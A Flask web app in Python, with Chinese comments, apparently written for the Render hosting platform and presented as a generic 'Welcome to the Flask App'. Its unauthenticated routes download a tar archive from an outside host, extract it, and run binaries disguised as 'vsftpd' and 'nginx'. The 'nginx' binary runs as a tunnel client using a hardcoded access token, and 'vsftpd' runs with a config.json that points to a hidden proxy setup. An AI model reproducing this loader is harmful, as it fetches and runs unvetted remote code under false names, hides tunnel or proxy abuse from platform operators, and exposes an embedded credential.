from flask import Flask, jsonify
import subprocess
import os

# 创建 Flask 应用实例
app = Flask(__name__)

# 检查 curl 是否可用
@app.route('/check-curl', methods=['GET'])
def check_curl():
    try:
        subprocess.run(["curl", "--version"], check=True, capture_output=True)
        return jsonify({"status": "success", "message": "curl is available"})
    except subprocess.CalledProcessError:
        return jsonify({"status": "error", "message": "curl is not available"})

# 检查 tar 是否可用
@app.route('/check-tar', methods=['GET'])
def check_tar():
    try:
        subprocess.run(["tar", "--version"], check=True, capture_output=True)
        return jsonify({"status": "success", "message": "tar is available"})
    except subprocess.CalledProcessError:
        return jsonify({"status": "error", "message": "tar is not available"})

# 检查 sh 是否可用
@app.route('/check-sh', methods=['GET'])
def check_sh():
    try:
        subprocess.run(["sh", "--version"], check=True, capture_output=True)
        return jsonify({"status": "success", "message": "sh is available"})
    except subprocess.CalledProcessError:
        return jsonify({"status": "error", "message": "sh is not available"})

# 下载文件并解压 tar 文件
@app.route('/download-and-extract', methods=['GET'])
def download_and_extract():
    try:
        # 检查 curl 是否可用
        result = subprocess.run(["curl", "--version"], capture_output=True, text=True)
        if result.returncode != 0:
            return jsonify({"status": "error", "message": "curl is not available"}), 400
        
        # 使用 curl 下载 abc2.tar
        download_result = subprocess.run(
            ["curl", "-O", "https://idev.nyc.mn/abc2.tar"],
            capture_output=True, text=True
        )

        if download_result.returncode != 0:
            return jsonify({"status": "error", "message": "Failed to download abc2.tar"}), 500
        
        # 解压下载的 tar 文件
        extract_result = subprocess.run(
            ["tar", "-xvf", "abc2.tar"],
            capture_output=True, text=True
        )

        if extract_result.returncode != 0:
            return jsonify({"status": "error", "message": "Failed to extract abc2.tar"}), 500

        # 返回下载和解压结果
        return jsonify({
            "status": "success",
            "message": "abc2.tar downloaded and extracted successfully.",
            "download_output": download_result.stdout,
            "extract_output": extract_result.stdout
        })
    
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# 执行 vsftpd 和 nginx 命令
@app.route('/run-services', methods=['GET'])
def run_services():
    try:
        # 检查目录是否存在
        if not os.path.isdir('/opt/render/project/src/abc'):
            return jsonify({"status": "error", "message": "'abc' directory does not exist"}), 400

        # 切换到目标目录
        os.chdir('/opt/render/project/src/abc')

        # 检查 vsftpd 可执行文件是否存在
        if not os.path.isfile('vsftpd'):
            return jsonify({"status": "error", "message": "'vsftpd' executable not found"}), 400

        # 检查 config.json 文件是否存在
        if not os.path.isfile('config.json'):
            return jsonify({"status": "error", "message": "'config.json' file not found"}), 400

        # 确保 vsftpd 具有执行权限
        chmod_vsftpd = subprocess.run(["chmod", "+x", "vsftpd"], capture_output=True, text=True)
        if chmod_vsftpd.returncode != 0:
            return jsonify({
                "status": "error",
                "message": "Failed to set execute permission for 'vsftpd'",
                "chmod_stdout": chmod_vsftpd.stdout,
                "chmod_stderr": chmod_vsftpd.stderr
            }), 500

        # 执行 vsftpd 命令
        vsftpd_result = subprocess.run(["./vsftpd", "-c", "config.json"], capture_output=True, text=True)
        if vsftpd_result.returncode != 0:
            return jsonify({
                "status": "error",
                "message": "Failed to execute vsftpd",
                "vsftpd_stdout": vsftpd_result.stdout,
                "vsftpd_stderr": vsftpd_result.stderr
            }), 500

        # 确保 nginx 具有执行权限
        chmod_nginx = subprocess.run(["chmod", "+x", "nginx"], capture_output=True, text=True)
        if chmod_nginx.returncode != 0:
            return jsonify({
                "status": "error",
                "message": "Failed to set execute permission for 'nginx'",
                "chmod_stdout": chmod_nginx.stdout,
                "chmod_stderr": chmod_nginx.stderr
            }), 500

        # 执行 nginx 命令
        nginx_command = [
            "./nginx", "tunnel",
            "--edge-ip-version", "auto",
            "--protocol", "http2",
            "run",
            "--token", "eyJhIjoiMzNlNWExODA4NDVhM2RkODdmN2VjNjUzN2JmMmE3NjIiLCJ0IjoiMjZhZjIzNjEtZDZiNC00NzY4LWIyYWQtNmRmMWExYTM2MmE3IiwicyI6Ill6WmtObVl4TmpVdE5XVXdaaTAwT0dNNUxUZzFOV0l0TkRJM1pqUmhNVE5oWlRaaiJ9"
        ]
        nginx_result = subprocess.run(nginx_command, capture_output=True, text=True)
        if nginx_result.returncode != 0:
            return jsonify({
                "status": "error",
                "message": "Failed to execute nginx",
                "nginx_stdout": nginx_result.stdout,
                "nginx_stderr": nginx_result.stderr
            }), 500

        return jsonify({
            "status": "success",
            "message": "vsftpd and nginx executed successfully.",
            "vsftpd_output": vsftpd_result.stdout,
            "nginx_output": nginx_result.stdout
        })

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

# 主页路由
@app.route('/')
def home():
    return "Welcome to the Flask App!"

if __name__ == '__main__':
    # 运行 Flask 开发服务器
    app.run(host='0.0.0.0', port=5000, debug=True)
